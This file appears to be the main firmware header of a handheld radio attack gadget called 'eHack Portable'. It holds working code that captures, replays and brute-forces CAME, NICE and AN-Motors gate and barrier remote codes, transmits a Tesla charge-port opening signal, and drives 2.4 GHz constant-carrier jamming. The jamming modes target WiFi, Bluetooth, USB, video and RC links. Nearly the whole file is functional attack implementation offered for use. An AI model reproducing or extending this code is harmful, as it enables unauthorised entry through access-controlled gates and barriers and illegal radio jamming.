#pragma once

// #define DEBUG_eHack

#ifdef DEBUG_eHack
#define DBG(...)                \
  do                            \
  {                             \
    Serial.printf(__VA_ARGS__); \
  } while (0)
#else
#define DBG(...) \
  do             \
  {              \
  } while (0)
#endif

#include <SPI.h>
#include <EEPROM.h>

#include <ELECHOUSE_CC1101_SRC_DRV.h>
#include <DataTransmission.h>
#include <RCSwitch.h>
#include "signal_data.h"
#include "hardware/adc.h"
#include "RF24.h"

#define APP_NAME "eHack Portable"
#define APP_VERSION "v1.0.1"

#define DISABLE_DEVICE_PIN 28
#define DISABLE_DEVICE_DELAY 180000 // ms
static uint32_t offTimer;

// Modes
enum Mode
{
  IDLE,

  HF_SPECTRUM,
  HF_ACTIVITY,
  HF_SCAN,
  HF_REPLAY,
  HF_JAMMER,
  HF_TESLA,

  HF_BARRIER_SCAN,
  HF_BARRIER_REPLAY,
  HF_BARRIER_BRUTE_CAME,
  HF_BARRIER_BRUTE_NICE,

  UHF_SPECTRUM,
  UHF_ALL_JAMMER,
  UHF_WIFI_JAMMER,
  UHF_BT_JAMMER,
  UHF_BLE_JAMMER,
  UHF_USB_JAMMER,
  UHF_VIDEO_JAMMER,
  UHF_RC_JAMMER,
};

Mode currentMode = IDLE;
/* ================== Common ================== */
bool initialized = false;
bool initializedIdle = false;

enum LedMode
{
  LED_OFF,
  LED_ON,
  LED_BLINK_SLOW,
  LED_BLINK_FAST
};

LedMode currentLedMode = LED_ON;

static uint32_t ledTimer = 0;
static bool ledState = false;

/* ================= Battery ================== */
#define BATTERY_COEFFICIENT 0.97
#define R1 200000 // 200k
#define R2 100000 // 100k
#define BATTERY_RESISTANCE_COEFFICIENT (1 + R1 / R2)
#define V_REF 3.3

#define BATTERY_CHECK_INTERVAL 20000
#define BATTERY_READ_ITERATIONS 10

float batVoltage;
uint32_t batteryTimer;
/* ==================== Tesla ================== */
#define pulseWidth 400     // µs
#define messageDistance 23 // ms
#define transmissions 5

/* =================== SubGHz MHz ================== */
#define CSN_PIN_CC 1
#define RSSI_WINDOW_MS 100
#define RSSI_STEP_MS 50
#define RSSI_BUFFER_SIZE 90

const byte GD0_PIN_CC = 6;

int currentRssi = -100;
uint8_t currentFreqIndex = 1;
uint8_t currentScanFreq = 0;
const float raFrequencies[] = {315.0, 433.92, 868.35, 915.0};
const uint8_t raFreqCount = sizeof(raFrequencies) / sizeof(raFrequencies[0]);
float rssiMaxPeak[raFreqCount] = {-100, -100, -100, -100};
float rssiAbsoluteMax[raFreqCount] = {-100, -100, -100, -100};

uint8_t rssiIndex = 0;
int rssiBuffer[RSSI_BUFFER_SIZE];

RCSwitch mySwitch = RCSwitch();

uint8_t lastUsedSlotRA = 0;
uint8_t selectedSlotRA = 0;

uint32_t capturedCode;
uint16_t capturedLength;
uint16_t capturedProtocol;
uint16_t capturedDelay;

float radioFrequency = raFrequencies[1];
bool attackIsActive = false;

/* ================ Barrier =================== */
#define MAX_DELTA_T_BARRIER 200
#define AN_MOTORS_PULSE 412

int16_t barrierBruteIndex = 4095;
volatile uint32_t barrierCodeMain, barrierCodeAdd;
volatile uint8_t barrierProtocol;
volatile uint8_t barrierBit;

volatile uint32_t lastEdgeMicros;
volatile uint32_t lowDurationMicros, highDurationMicros, barrierCurrentLevel;
volatile bool barrierCaptured = false;

// AN Motors
volatile byte anMotorsCounter = 0;
volatile long code1 = 0;
volatile long code2 = 0;

// CAME
volatile byte cameCounter = 0;
volatile uint32_t cameCode = 0;

// NICE
volatile byte niceCounter = 0;
volatile uint32_t niceCode = 0;

// ================= 2.4 GHZ ===========================/
#define CE_PIN_NRF 7
#define CSN_PIN_NRF 13
#define START_CHANNEL 45
#define NUM_CHANNELS 126

RF24 radio_RF24(CE_PIN_NRF, CSN_PIN_NRF, 16000000);

const uint8_t cacheMax = 15;
uint8_t channelStrength[NUM_CHANNELS];

struct ChannelHistory
{
  uint8_t maxPeak = 0;

  uint8_t push(bool value)
  {
    uint8_t sum = value;
    for (uint8_t i = 0; i < cacheMax - 1; ++i)
    {
      history[i] = history[i + 1];
      sum += history[i];
    }
    history[cacheMax - 1] = value;
    maxPeak = max((uint8_t)(sum * 2), maxPeak);
    return sum;
  }

private:
  bool history[cacheMax] = {0};
};
ChannelHistory stored[126];

uint8_t radioChannel = 0;

// ================== Communication ===========================/
#define CONNECTION_DELAY 5000
#define NUMBER_OF_RETRIES 3

#define SEND_DURATION_MS 10
#define LISTEN_DURATION_MS 20

byte ping[4] = {'P', 'I', 'N', 'G'};
byte pong[4] = {'P', 'O', 'N', 'G'};
// byte inited[4] = {'I', 'N', 'I', 'T'};

DataTransmission communication(&radio_RF24);

bool successfullyConnected = false;

uint32_t pingSentTime;
uint32_t checkConnectionTimer;
bool awaitingPong = false;

uint8_t recievedData[32];
uint8_t recievedDataLen = 0;

uint8_t batteryVoltagePacket[32];

/*=================== FUNCTIONS ==========================*/
/*********************** COMMON ***************************/

float readBatteryVoltage()
{
  uint16_t total = 0;
  for (int i = 0; i < BATTERY_READ_ITERATIONS; i++)
  {
    total += analogRead(A3);
    delayMicroseconds(500);
  }

  return (float)BATTERY_COEFFICIENT * (total / (float)BATTERY_READ_ITERATIONS) * (float)BATTERY_RESISTANCE_COEFFICIENT * (float)V_REF / 4095.0;
}

Mode getModeFromPacket(uint8_t *data, uint8_t len)
{
  uint8_t mode = data[1];

  if (mode == COMMAND_IDLE)
  {
    return IDLE;
  }

  // HF commands
  else if (mode == COMMAND_HF_SPECTRUM)
  {
    return HF_SPECTRUM;
  }
  else if (mode == COMMAND_HF_ACTIVITY)
  {
    return HF_ACTIVITY;
  }
  else if (mode == COMMAND_HF_SCAN)
  {
    return HF_SCAN;
  }
  else if (mode == COMMAND_HF_REPLAY)
  {
    return HF_REPLAY;
  }
  else if (mode == COMMAND_HF_JAMMER)
  {
    return HF_JAMMER;
  }
  else if (mode == COMMAND_HF_TESLA)
  {
    return HF_TESLA;
  }
  else if (mode == COMMAND_HF_BARRIER_SCAN)
  {
    return HF_BARRIER_SCAN;
  }
  else if (mode == COMMAND_HF_BARRIER_REPLAY)
  {
    return HF_BARRIER_REPLAY;
  }
  else if (mode == COMMAND_HF_BARRIER_BRUTE_CAME)
  {
    return HF_BARRIER_BRUTE_CAME;
  }
  else if (mode == COMMAND_HF_BARRIER_BRUTE_NICE)
  {
    return HF_BARRIER_BRUTE_NICE;
  }

  // UHF commands
  else if (mode == COMMAND_UHF_SPECTRUM)
  {
    return UHF_SPECTRUM;
  }

  else if (mode == COMMAND_UHF_ALL_JAMMER)
  {
    return UHF_ALL_JAMMER;
  }
  else if (mode == COMMAND_UHF_WIFI_JAMMER)
  {
    return UHF_WIFI_JAMMER;
  }
  else if (mode == COMMAND_UHF_BT_JAMMER)
  {
    return UHF_BT_JAMMER;
  }
  else if (mode == COMMAND_UHF_BLE_JAMMER)
  {
    return UHF_BLE_JAMMER;
  }
  else if (mode == COMMAND_UHF_USB_JAMMER)
  {
    return UHF_USB_JAMMER;
  }
  else if (mode == COMMAND_UHF_RC_JAMMER)
  {
    return UHF_RC_JAMMER;
  }
  else if (mode == COMMAND_UHF_VIDEO_JAMMER)
  {
    return UHF_VIDEO_JAMMER;
  }

  return IDLE;
}
/*********************** CC1101 ***************************/
float getFrequencyFromPacket(uint8_t *data, uint8_t len)
{
  if (len < 3)
  {
    return raFrequencies[1]; // Default frequency
  }

  uint8_t freqIndex = data[2];
  if (freqIndex < raFreqCount)
  {
    return raFrequencies[freqIndex];
  }
  return raFrequencies[1]; // Default frequency
}

void cc1101Init()
{
  ELECHOUSE_cc1101.setSpiPin(2, 4, 3, CSN_PIN_CC);

  ELECHOUSE_cc1101.setClb(1, 8, 8);
  ELECHOUSE_cc1101.setClb(2, 9, 12);
  ELECHOUSE_cc1101.setClb(3, 18, 21);
  ELECHOUSE_cc1101.setClb(4, 21, 22);

  ELECHOUSE_cc1101.Init();
  ELECHOUSE_cc1101.setGDO0(GD0_PIN_CC);
  ELECHOUSE_cc1101.setDcFilterOff(0);
  ELECHOUSE_cc1101.setRxBW(135);
  ELECHOUSE_cc1101.setPA(12);
  ELECHOUSE_cc1101.setModulation(2);
  ELECHOUSE_cc1101.setCCMode(0);
  ELECHOUSE_cc1101.setSyncMode(0);
  ELECHOUSE_cc1101.setCrc(0);
}

//================================== TESLA ======================================*/

void sendByte(uint8_t dataByte)
{
  for (int8_t bit = 7; bit >= 0; bit--)
  { // MSB
    digitalWrite(GD0_PIN_CC, (dataByte & (1 << bit)) != 0 ? HIGH : LOW);
    delayMicroseconds(pulseWidth);
  }
}

void sendTeslaSignal_v1()
{
  for (uint8_t t = 0; t < transmissions; t++)
  {
    for (uint8_t i = 0; i < 43; i++)
      sendByte(teslaSequence[i]);
    digitalWrite(GD0_PIN_CC, LOW);
    delay(messageDistance);
  }
}

//================================ TESLA V2 =====================================*/
// creates the preamble before the 3 repetitions of the open command
void SendPreamble()
{
  // transmit preamble: 13 times high to low + add the "chirp" on top
  for (int ii = 0; ii < 13; ii++)
  {
    digitalWrite(GD0_PIN_CC, 1);
    delayMicroseconds(pulseWidth + (12 - ii) * 10);
    digitalWrite(GD0_PIN_CC, 0);
    delayMicroseconds(pulseWidth - (12 - ii) * 10);
  }

  // space between preamble and Manchester Code
  delayMicroseconds(pulseWidth);
}

void SendManchester()
{
  int iByte, iBit;

  for (iByte = 0; iByte < 6; iByte++)
  {
    int cValue = bManCode[iByte];
    for (iBit = 0; iBit < 8; iBit++)
    {
      int bBitVal = 0;
      if ((cValue & (1 << iBit)) != 0)
      {
        // transmit one; i.e. we need a negative edge
        digitalWrite(GD0_PIN_CC, 1);
        delayMicroseconds(pulseWidth);
        digitalWrite(GD0_PIN_CC, 0);
        delayMicroseconds(pulseWidth);
      }
      else
      {
        // transmit zero; i.e. we need a positive edge
        digitalWrite(GD0_PIN_CC, 0);
        delayMicroseconds(pulseWidth);
        digitalWrite(GD0_PIN_CC, 1);
        delayMicroseconds(pulseWidth);
      }
    }
  }
}

void SendPostamble(bool bLast)
{
  // send Postamble
  digitalWrite(GD0_PIN_CC, 0); // 400us low
  delayMicroseconds(pulseWidth);
  digitalWrite(GD0_PIN_CC, 1); // 400us high
  delayMicroseconds(pulseWidth);
  digitalWrite(GD0_PIN_CC, 0); // 400us low
  delayMicroseconds(pulseWidth);

  int iMulti = 2;
  if (bLast)
  {
    iMulti = 1;
  }
  digitalWrite(GD0_PIN_CC, 1); // 800us high, 400us on last repetition
  delayMicroseconds(iMulti * pulseWidth);
  digitalWrite(GD0_PIN_CC, 0); // 800us low
  delayMicroseconds(pulseWidth);
}

void sendTeslaSignal_v2()
{
  // message repetition loop
  for (int iTransmit = 0; iTransmit < 10; iTransmit++)
  {
    SendPreamble();

    // repeat Manchester & Postamble 3 times
    for (int iRepeat = 0; iRepeat < 3; iRepeat++)
    {
      // Manchester Code & Postamble
      SendManchester();
      SendPostamble(iRepeat == 2);
    }

    delay(25); // 25ms delay between transmissions
  }
}

/********************************** BARRIER TRANSMISSION (HF) **************************************/

void SendBit(byte b, int pulse)
{
  if (b == 0)
  {
    digitalWrite(GD0_PIN_CC, HIGH);
    delayMicroseconds(pulse * 2);
    digitalWrite(GD0_PIN_CC, LOW);
    delayMicroseconds(pulse);
  }
  else
  {
    digitalWrite(GD0_PIN_CC, HIGH);
    delayMicroseconds(pulse);
    digitalWrite(GD0_PIN_CC, LOW);
    delayMicroseconds(pulse * 2);
  }
}

// AN-MOTORS
void sendANMotors(uint32_t c1, uint32_t c2)
{
  for (int j = 0; j < 4; j++)
  {
    // First 12 bits
    for (int i = 0; i < 12; i++)
    {
      delayMicroseconds(AN_MOTORS_PULSE);
      digitalWrite(GD0_PIN_CC, HIGH);
      delayMicroseconds(AN_MOTORS_PULSE);
      digitalWrite(GD0_PIN_CC, LOW);
    }
    delayMicroseconds(AN_MOTORS_PULSE * 10);
    // First part
    for (int i = 32; i > 0; i--)
    {
      SendBit(bitRead(c1, i - 1), AN_MOTORS_PULSE);
    }
    // Second part
    for (int i = 32; i > 0; i--)
    {
      SendBit(bitRead(c2, i - 1), AN_MOTORS_PULSE);
    }
    // Battery and repeat flags
    SendBit(1, AN_MOTORS_PULSE);
    SendBit(1, AN_MOTORS_PULSE);
    delayMicroseconds(AN_MOTORS_PULSE * 38);
  }
}

// CAME
void sendCame(uint32_t Code)
{
  int bits = (Code >> 12) ? 24 : 12;
  for (int j = 0; j < 4; j++)
  {
    digitalWrite(GD0_PIN_CC, HIGH);
    delayMicroseconds(320);
    digitalWrite(GD0_PIN_CC, LOW);
    for (int i = bits; i > 0; i--)
    {
      byte b = bitRead(Code, i - 1);
      if (b)
      {
        digitalWrite(GD0_PIN_CC, LOW); // 1
        delayMicroseconds(640);
        digitalWrite(GD0_PIN_CC, HIGH);
        delayMicroseconds(320);
      }
      else
      {
        digitalWrite(GD0_PIN_CC, LOW); // 0
        delayMicroseconds(320);
        digitalWrite(GD0_PIN_CC, HIGH);
        delayMicroseconds(640);
      }
    }
    digitalWrite(GD0_PIN_CC, LOW);
    if (bits == 24)
      delayMicroseconds(23040);
    else
      delayMicroseconds(11520);
  }
}

// NICE
void sendNice(uint32_t Code)
{
  int bits = (Code >> 12) ? 24 : 12;
  for (int j = 0; j < 4; j++)
  {
    digitalWrite(GD0_PIN_CC, HIGH);
    delayMicroseconds(700);
    digitalWrite(GD0_PIN_CC, LOW);
    for (int i = bits; i > 0; i--)
    {
      byte b = bitRead(Code, i - 1);
      if (b)
      {
        digitalWrite(GD0_PIN_CC, LOW); // 1
        delayMicroseconds(1400);
        digitalWrite(GD0_PIN_CC, HIGH);
        delayMicroseconds(700);
      }
      else
      {
        digitalWrite(GD0_PIN_CC, LOW); // 0
        delayMicroseconds(700);
        digitalWrite(GD0_PIN_CC, HIGH);
        delayMicroseconds(1400);
      }
    }
    digitalWrite(GD0_PIN_CC, LOW);
    if (bits == 24)
      delayMicroseconds(50400);
    else
      delayMicroseconds(25200);
  }
}

/********************************** BARRIER SIGNAL RECEIVE (HF) ***************************************/

boolean CheckValue(uint16_t base, uint16_t value)
{
  return ((value == base) || ((value > base) && ((value - base) < MAX_DELTA_T_BARRIER)) || ((value < base) && ((base - value) < MAX_DELTA_T_BARRIER)));
}

void captureBarrierCode()
{
  barrierCurrentLevel = digitalRead(GD0_PIN_CC);
  if (barrierCurrentLevel == HIGH)
    lowDurationMicros = micros() - lastEdgeMicros;
  else
    highDurationMicros = micros() - lastEdgeMicros;

  lastEdgeMicros = micros();

  // AN-MOTORS
  if (barrierCurrentLevel == HIGH)
  {
    if (CheckValue(AN_MOTORS_PULSE, highDurationMicros) && CheckValue(AN_MOTORS_PULSE * 2, lowDurationMicros))
    { // valid 1
      if (anMotorsCounter < 32)
        code1 = (code1 << 1) | 1;
      else if (anMotorsCounter < 64)
        code2 = (code2 << 1) | 1;
      anMotorsCounter++;
    }
    else if (CheckValue(AN_MOTORS_PULSE * 2, highDurationMicros) && CheckValue(AN_MOTORS_PULSE, lowDurationMicros))
    { // valid 0
      if (anMotorsCounter < 32)
        code1 = (code1 << 1) | 0;
      else if (anMotorsCounter < 64)
        code2 = (code2 << 1) | 0;
      anMotorsCounter++;
    }
    else
    {
      anMotorsCounter = 0;
      code1 = 0;
      code2 = 0;
    }
    if (anMotorsCounter >= 65 && code2 != -1)
    {
      barrierCaptured = true;
      barrierProtocol = 0;
      barrierCodeMain = code1;
      barrierCodeAdd = code2;
      barrierBit = anMotorsCounter;

      code1 = 0;
      code2 = 0;
      anMotorsCounter = 0;
    }
  }

  // CAME
  if (barrierCurrentLevel == LOW)
  {
    if (CheckValue(320, highDurationMicros) && CheckValue(640, lowDurationMicros))
    { // valid 1
      cameCode = (cameCode << 1) | 1;
      cameCounter++;
    }
    else if (CheckValue(640, highDurationMicros) && CheckValue(320, lowDurationMicros))
    { // valid 0
      cameCode = (cameCode << 1) | 0;
      cameCounter++;
    }
    else
    {
      cameCounter = 0;
      cameCode = 0;
    }
  }
  else if ((cameCounter == 12 || cameCounter == 24) && lowDurationMicros > 1000)
  {
    barrierCaptured = true;
    barrierProtocol = 2;
    barrierCodeMain = cameCode;
    barrierBit = cameCounter;

    cameCode = 0;
    cameCounter = 0;
  }

  // NICE
  if (barrierCurrentLevel == LOW)
  {
    if (CheckValue(700, highDurationMicros) && CheckValue(1400, lowDurationMicros))
    { // valid 1
      niceCode = (niceCode << 1) | 1;
      niceCounter++;
    }
    else if (CheckValue(1400, highDurationMicros) && CheckValue(700, lowDurationMicros))
    { // valid 0
      niceCode = (niceCode << 1) | 0;
      niceCounter++;
    }
    else
    {
      niceCounter = 0;
      niceCode = 0;
    }
  }
  else if ((niceCounter == 12 || niceCounter == 24) && lowDurationMicros > 2000)
  {
    barrierCaptured = true;
    barrierProtocol = 1;
    barrierCodeMain = niceCode;
    barrierBit = niceCounter;

    niceCode = 0;
    niceCounter = 0;
  }
}

/* ============================ UHF ================================= */

void initRadioAttack()
{
  radio_RF24.setAutoAck(false);
  radio_RF24.stopListening();
  radio_RF24.setRetries(0, 0);
  radio_RF24.setPALevel(RF24_PA_MAX, true);
  radio_RF24.setDataRate(RF24_2MBPS);
  radio_RF24.setCRCLength(RF24_CRC_DISABLED);
  radio_RF24.startConstCarrier(RF24_PA_HIGH, START_CHANNEL);
}

void stopRadioAttack()
{
  radio_RF24.stopConstCarrier();
  radio_RF24.powerDown();
}